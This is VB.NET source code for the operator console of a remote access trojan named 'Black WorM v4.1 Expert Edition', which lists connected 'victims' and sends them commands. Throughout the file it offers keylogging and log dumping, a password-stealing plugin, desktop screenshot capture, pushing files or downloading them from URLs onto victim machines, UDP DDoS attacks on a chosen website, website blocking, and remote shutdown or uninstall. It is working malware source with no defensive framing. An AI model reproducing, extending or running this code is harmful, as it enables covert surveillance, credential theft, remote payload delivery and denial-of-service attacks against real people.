Public Class Form1
    Public WithEvents S As Listner
    Public vr As String = "Black WorM v4.1 Expert Edition | Online[ xxx ] Sel[ sss ]"
    Public Y As String = "|Black|"
    Public k As String = InputBox("Start", "[ Open Port ]", "5050")
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If k = "" Then
            End
        End If
    End Sub
    Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
        Dim A As String() = Split(BS(b), Y)
        Try
            Select Case A(0)
                Case "!0" ' i recive victim info
                    SyncLock L1.Items
                        u.L = L1.Items.Add(u.IP, "", "X.png")
                        u.L.Tag = u
                        u.L.Text = A(1)
                        u.L.SubItems.Add(u.IP.Split(":")(0))
                        For i As Integer = 2 To A.Length - 1
                            u.L.SubItems.Add(A(i))
                        Next
                        u.L.ImageKey = u.L.SubItems(hco.Index).Text & ".png"
                        L1.FX()
                        Try
                            For i = 0 To L1.Items.Count - 1
                                If L1.Items(i).SubItems(11).Text = "Yes" Then
                                    L1.Items(i).ForeColor = Color.Blue
                                End If
                            Next

                        Catch ex As Exception

                        End Try

                    End SyncLock
                Case "!1" ' update Active Window
                    SyncLock L1.Items
                        u.L.SubItems(hac.Index).Text = A(1)
                    End SyncLock
                Case "ping" ' ping
                    SyncLock L1.Items
                        u.IsPinged = False
                        u.L.SubItems(hping.Index).Text = u.MS & "ms"
                        u.MS = 0
                    End SyncLock
                Case "keydump"
                    If IO.Directory.Exists("logs") = True Then
                        If IO.File.Exists("logs\" & A(2) & ".log") Then
                            IO.File.Delete("logs\" & A(2) & ".log")
                            IO.File.WriteAllText("logs" & "\" & A(2) & ".log", A(1))
                        Else
                            IO.File.WriteAllText("logs" & "\" & A(2) & ".log", A(1))
                        End If
                    Else
                        IO.Directory.CreateDirectory("logs")
                        IO.File.WriteAllText("logs" & "\" & A(2) & ".log", A(1))
                    End If
                    MsgBox("Victim Keylog Has Been Dumped in logs folder", MsgBoxStyle.Information, "Done !")
                Case "sendpass"
                    If IO.Directory.Exists("pass") = True Then
                        If IO.File.Exists("pass\" & A(2) & ".txt") Then
                            IO.File.Delete("pass\" & A(2) & ".txt")
                            IO.File.WriteAllText("pass" & "\" & A(2) & ".txt", A(1))
                        Else
                            IO.File.WriteAllText("pass" & "\" & A(2) & ".txt", A(1))
                        End If
                    Else
                        IO.Directory.CreateDirectory("pass")
                        IO.File.WriteAllText("pass" & "\" & A(2) & ".txt", A(1))
                    End If
                    MsgBox("Victim Password Has Been Dumped in pass folder", MsgBoxStyle.Information, "Done !")
                Case "sendesktop"
                    If IO.Directory.Exists("screenshot") = True Then
                        If IO.File.Exists("screenshot\" & A(2) & ".png") Then
                            IO.File.Delete("screenshot\" & A(2) & ".png")
                            IO.File.WriteAllBytes("screenshot" & "\" & A(2) & ".png", Convert.FromBase64String(A(1)))
                        Else
                            IO.File.WriteAllBytes("screenshot" & "\" & A(2) & ".png", Convert.FromBase64String(A(1)))
                        End If
                    Else
                        IO.Directory.CreateDirectory("screenshot")
                        IO.File.WriteAllBytes("screenshot" & "\" & A(2) & ".png", Convert.FromBase64String(A(1)))
                    End If
                    MsgBox("Victim Desktop Has Been Dumped in screenshot folder", MsgBoxStyle.Information, "Done !")
            End Select
        Catch ex As Exception
        End Try
    End Sub
    Private Sub S_Disconnected(ByVal u As USER) Handles S.Disconnected
        SyncLock L1.Items
            Try
                L1.Items(u.IP).Remove()
            Catch ex As Exception
            End Try

        End SyncLock
    End Sub

    Private Sub ToolStripStatusLabel1_Click(sender As System.Object, e As System.EventArgs) Handles ToolStripStatusLabel1.Click
        Form2.Show()
    End Sub
    Private Sub ToolStripStatusLabel2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripStatusLabel2.Click
        Form5.Show()
    End Sub
    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick

    End Sub
    Private Sub FromDiskToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromDiskToolStripMenuItem1.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = "All Type (*.*)|*.*"
                .Title = "Select Your File To Upload"
            End With
            o.ShowDialog()
            Dim n As New IO.FileInfo(o.FileName)
            If o.FileName.Length > 0 Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "sendfile" & Y & n.Name & Y & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            End If
        Catch X As Exception
        End Try
    End Sub
    Private Sub FromURLToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            Dim a As String = InputBox("Enter the Direct Link", "File Url")
            Dim aa As String = InputBox("Enter the name of the file", "File Name")
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "download" & Y & a & Y & aa)
            Next
        Catch X As Exception
        End Try
    End Sub
    Private Sub OpenWebSiteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenWebSiteToolStripMenuItem.Click
        Try
            Dim PageUrl As String = InputBox("WebSite Link", "URL", "[ - - - - - - - - - ]")
            If PageUrl = "" Then
                Exit Sub
            Else
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "OpenPage" & Y & PageUrl)
                Next
            End If
        Catch X As Exception
        End Try
    End Sub
    Private Sub DDOSAttackToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DDOSAttackToolStripMenuItem1.Click
        Dim strD As String = Interaction.InputBox("WebSite URL :", "DDOS Attack", "www.google.com")
        If strD = "" Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "UDP" & Y & strD)
            Next
        End If
    End Sub
    Private Sub RestartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem1.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "RestartServer")
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub UninstallToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem1.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "uninstall")
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub CloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "CloseServer")
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.Text = vr.Replace("xxx", L1.Items.Count).Replace("port", k).Replace("sss", L1.SelectedItems.Count)

    End Sub
    Private Sub BlockWebSiteToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BlockWebSiteToolStripMenuItem.Click
        Try
            Dim PageUrlToBlock As String = InputBox("WebSite Link", "URL", "[ - - - - - - - - - ]")
            If PageUrlToBlock = "" Then
                Exit Sub
            Else
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "BlocKPage" & Y & PageUrlToBlock)
                Next
            End If
        Catch X As Exception
        End Try
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogoffToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "Logoff")
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "Restart")
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "Shutdown")
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub StartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub SendPugToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub UpdateToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UpdateToolStripMenuItem.Click
        Try
            Dim a As New OpenFileDialog
            With a
                .Filter = "(*.exe)|*.exe"
                .Title = "Select Your Server To Update"
            End With
            a.ShowDialog()
            Dim n As New IO.FileInfo(a.FileName)
            If a.FileName.Length > 0 Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "Update" & Y & n.Name & Y & Convert.ToBase64String(IO.File.ReadAllBytes(a.FileName)))
                Next
            End If
        Catch X As Exception
        End Try
    End Sub
    Private Sub WormSettingToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles WormSettingToolStripMenuItem.Click

    End Sub
    Private Sub StartToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem.Click
        Control.CheckForIllegalCrossThreadCalls = False
        Try
            S = New Listner(k)
            StartToolStripMenuItem.Enabled = False
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, "Error ):")
            End
        End Try
    End Sub

    Private Sub SendPugToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendPugToolStripMenuItem.Click
        Dim nopip As New Form6
        nopip.Show()
    End Sub
    Private Sub RunCmdToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunCmdToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "getpass" & Y & Convert.ToBase64String(IO.File.ReadAllBytes("plugin/pwd.dll")))
        Next
    End Sub
    Private Sub KeylogstartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KeylogstartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "keystart")
        Next
    End Sub
    Private Sub DumpToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DumpToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "keydump")
        Next
    End Sub

    Private Sub GetDesktopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetDesktopToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "getdesktop" & Y & Convert.ToBase64String(IO.File.ReadAllBytes("plugin/desktop.dll")))
        Next
    End Sub
End Class
Public Class LV
    Inherits System.Windows.Forms.ListView
    Public Sub New()
        MyBase.New()
        Me.AllowDrop = False
        Me.Font = New Font("arial", 8, FontStyle.Bold)
        Me.Dock = DockStyle.Fill
        Me.FullRowSelect = True
        Me.View = Windows.Forms.View.Details
        Me.SetStyle((ControlStyles.OptimizedDoubleBuffer Or ControlStyles.AllPaintingInWmPaint), True)
        Me.SetStyle(ControlStyles.EnableNotifyMessage, True)
    End Sub
    Public Sub FX()
        Me.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub
    Protected Overrides Sub OnNotifyMessage(ByVal m As Message)
        Exit Sub
        If (m.Msg <> 20) Then
            MyBase.OnNotifyMessage(m)
        End If
    End Sub
#Region "Listview Sort"
    Private m_SortingColumn As ColumnHeader
    Public Sub ColumnClick(ByVal sender As Object, ByVal e As System.Windows.Forms.ColumnClickEventArgs) Handles MyBase.ColumnClick
        Dim new_sorting_column As ColumnHeader = sender.Columns(e.Column)
        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            sort_order = SortOrder.Ascending
        Else
            If new_sorting_column.Equals(m_SortingColumn) Then
                If m_SortingColumn.Text.StartsWith("+") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                sort_order = SortOrder.Ascending
            End If
            m_SortingColumn.Text = m_SortingColumn.Text.Substring(1)
        End If
        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "+" & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "-" & m_SortingColumn.Text
        End If
        If sender Is Nothing Then Exit Sub
        sender.ListViewItemSorter = New clsListviewSorter(e.Column, sort_order)
        sender.Sort()
        sender.ListViewItemSorter = Nothing
    End Sub
    Public Class clsListviewSorter
        Implements IComparer
        Private m_ColumnNumber As Integer
        Private m_SortOrder As SortOrder
        Public Sub New(ByVal column_number As Integer, ByVal sort_order As SortOrder)
            m_ColumnNumber = column_number
            m_SortOrder = sort_order
        End Sub
        Public Function Compare(ByVal x As Object, ByVal y As Object) As Integer Implements System.Collections.IComparer.Compare
            Dim item_x As ListViewItem = DirectCast(x, ListViewItem)
            Dim item_y As ListViewItem = DirectCast(y, ListViewItem)
            Dim string_x As String
            If item_x.SubItems.Count <= m_ColumnNumber Then
                string_x = ""
            Else
                string_x = item_x.SubItems(m_ColumnNumber).Text
            End If
            Dim string_y As String
            If item_y.SubItems.Count <= m_ColumnNumber Then
                string_y = ""
            Else
                string_y = item_y.SubItems(m_ColumnNumber).Text
            End If
            If m_SortOrder = SortOrder.Ascending Then
                If IsNumeric(string_x) And IsNumeric(string_y) Then
                    Return Val(string_x).CompareTo(Val(string_y))
                ElseIf IsDate(string_x) And IsDate(string_y) Then
                    Return DateTime.Parse(string_x).CompareTo(DateTime.Parse(string_y))
                Else
                    Return String.Compare(string_x, string_y)
                End If
            Else
                If IsNumeric(string_x) And IsNumeric(string_y) Then
                    Return Val(string_y).CompareTo(Val(string_x))
                ElseIf IsDate(string_x) And IsDate(string_y) Then
                    Return DateTime.Parse(string_y).CompareTo(DateTime.Parse(string_x))
                Else
                    Return String.Compare(string_y, string_x)
                End If
            End If
        End Function
    End Class
#End Region
End Class
